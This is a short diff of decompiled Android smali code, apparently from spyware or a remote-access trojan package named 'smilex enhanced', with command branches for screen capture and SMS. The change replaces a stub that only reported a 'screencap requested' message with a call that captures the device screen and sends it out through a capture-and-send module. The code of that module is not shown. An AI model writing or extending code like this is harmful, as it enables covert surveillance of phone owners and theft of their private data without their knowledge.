@@ -300,9 +300,7 @@
     move-result v3
     if-eqz v3, :cmd_sms
 
-    const-string v3, "screencap"
-    const-string v4, "requested"
-    invoke-static {v3, v4}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
+    invoke-static {p0}, Lcom/smilex/enhanced/modules/ScreenCaptureModule;->captureAndSend(Landroid/content/Context;)V
     goto :end
 
     # --- SMS ---
